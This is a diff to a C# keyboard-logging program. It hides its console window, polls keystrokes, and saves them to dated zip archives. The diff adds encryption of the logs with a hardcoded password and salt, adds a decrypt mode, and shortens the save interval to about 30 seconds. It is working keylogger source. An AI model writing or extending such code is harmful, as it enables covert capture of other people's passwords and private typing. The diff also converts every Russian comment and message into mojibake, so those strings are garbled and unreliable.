@@ -1,3 +1,4 @@
+п»ї// Encoding: UTF-8
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -18,6 +19,9 @@ namespace Foo
     static Dictionary<Keys, string> keys_to_str;
     static DateTime last_key_pressed_time = new DateTime(0);
 
+    const string password = "(\x23, \x12, \x19\x94)";
+    static readonly byte[] salt = Encoding.UTF8.GetBytes("fb$UWvZmTQ");
+
     static TimeSpan one_hour = new TimeSpan(TimeSpan.TicksPerHour);
     static TimeSpan one_minute = new TimeSpan(TimeSpan.TicksPerMinute);
     static TimeSpan two_seconds = new TimeSpan(TimeSpan.TicksPerSecond * 2);
@@ -36,11 +40,11 @@ namespace Foo
     {
       if (keys_buffer.Count() == 0)
       {
-        Console.WriteLine("Нечего сохранять");
+        Console.WriteLine("РќРµС‡РµРіРѕ СЃРѕС…СЂР°РЅСЏС‚СЊ");
         return;
       }
 
-      Console.WriteLine("Сохранение в {0} ...", filename);
+      Console.WriteLine("РЎРѕС…СЂР°РЅРµРЅРёРµ РІ {0} ...", filename);
 
       File.AppendAllText(filename, keys_buffer);
 
@@ -51,11 +55,11 @@ namespace Foo
     {
       if (keys_buffer.Count() == 0)
       {
-        Console.WriteLine("Нечего сохранять");
+        Console.WriteLine("РќРµС‡РµРіРѕ СЃРѕС…СЂР°РЅСЏС‚СЊ");
         return;
       }
 
-      Console.WriteLine("Добавление файла {0} в архив {1} ...",
+      Console.WriteLine("Р”РѕР±Р°РІР»РµРЅРёРµ С„Р°Р№Р»Р° {0} РІ Р°СЂС…РёРІ {1} ...",
         text_filename, archive_filename);
 
       byte[] keys_bytes = Encoding.UTF8.GetBytes(keys_buffer);
@@ -70,7 +74,8 @@ namespace Foo
         {
           using (MemoryStream byte_stream = new MemoryStream(keys_bytes))
           {
-            byte_stream.CopyTo(file_stream);
+            Foo.Cryptography.EncryptData(byte_stream, file_stream, password, salt);
+            //byte_stream.CopyTo(file_stream);
           }
         }
       }
@@ -173,10 +178,25 @@ namespace Foo
       ShowWindow(hWnd, 0);
     }
 
-    static void Main()
+    static void Main(string[] argv)
     {
-      // нажатия из chrome в виртуалке ловятся?
-      // нажатия из хоста не ловятся
+      // TODO: РџРµСЂРµРЅРµСЃС‚Рё РІ РґСЂСѓРіРѕРµ РїСЂРёР»РѕР¶РµРЅРёРµ
+      if (argv.Length == 2)
+      {
+        Console.WriteLine("Decrypting {0} to {1} ...", argv[0], argv[1]);
+
+        using (Stream input_stream = new FileStream(argv[0], FileMode.Open, FileAccess.Read))
+        {
+          using (Stream output_stream = new FileStream(argv[1], FileMode.Open, FileAccess.Write))
+          {
+            output_stream.SetLength(0);
+            Foo.Cryptography.DecryptData(input_stream, output_stream, password, salt);
+          }
+        }
+      }
+
+      // РЅР°Р¶Р°С‚РёСЏ РёР· chrome РІ РІРёСЂС‚СѓР°Р»РєРµ Р»РѕРІСЏС‚СЃСЏ?
+      // РЅР°Р¶Р°С‚РёСЏ РёР· С…РѕСЃС‚Р° РЅРµ Р»РѕРІСЏС‚СЃСЏ
       scanned_key_set = new List<Keys>()
       {
         // _vs
@@ -219,9 +239,9 @@ namespace Foo
         Keys.D8,
         Keys.D9,
 
-        // Кнопки NumPad
-        // Разные коды в зависимости от NumLock)
-        // На экранной клавиатуре нет таких кнопок
+        // РљРЅРѕРїРєРё NumPad
+        // Р Р°Р·РЅС‹Рµ РєРѕРґС‹ РІ Р·Р°РІРёСЃРёРјРѕСЃС‚Рё РѕС‚ NumLock)
+        // РќР° СЌРєСЂР°РЅРЅРѕР№ РєР»Р°РІРёР°С‚СѓСЂРµ РЅРµС‚ С‚Р°РєРёС… РєРЅРѕРїРѕРє
         // tv 
         Keys.NumPad0,
         Keys.NumPad1,
@@ -238,7 +258,7 @@ namespace Foo
         Keys.Multiply,
         Keys.Divide,
 
-        // Управляющие кнопки
+        // РЈРїСЂР°РІР»СЏСЋС‰РёРµ РєРЅРѕРїРєРё
         Keys.ShiftKey, //  v 
         Keys.Back,     // tvs
         Keys.Enter,    // tvs
@@ -288,24 +308,22 @@ namespace Foo
 
       const int sleep_ms = 2;
       const int scan_time_ms = 13;
-      const int j = 60 * 60 * 1000 / (sleep_ms + scan_time_ms);
+      const int j = 30 * 1000 / (sleep_ms + scan_time_ms);
       const int max_buffer_count = 4096 - 14;
 
-      for (uint i = 0; true; i++)
+      while (true)
       {
-        ScanKeyboard();
-
-        if (i % j == 0 || keys_buffer.Count() > max_buffer_count)
+        for (uint i = 0; i < j && keys_buffer.Count() < max_buffer_count; i++)
         {
-          SaveToZip(
-            "logs/" + DateTime.Now.ToString("yyyy_MM_dd") + ".zip",
-            DateTime.Now.ToString("hh_mm_ss") + ".txt");
+          Thread.Sleep(sleep_ms);
+          ScanKeyboard();
         }
 
-        Thread.Sleep(sleep_ms);
+        SaveToZip("logs/" + DateTime.Now.ToString("yyyy_MM_dd") + ".zip",
+          DateTime.Now.ToString("hh_mm_ss") + ".txt");
       }
     }
   }
 }
-// ЦП 0%
-// Память 7300 КБ, на что?
+// Р¦Рџ 0%
+// РџР°РјСЏС‚СЊ 7300 РљР‘, РЅР° С‡С‚Рѕ?
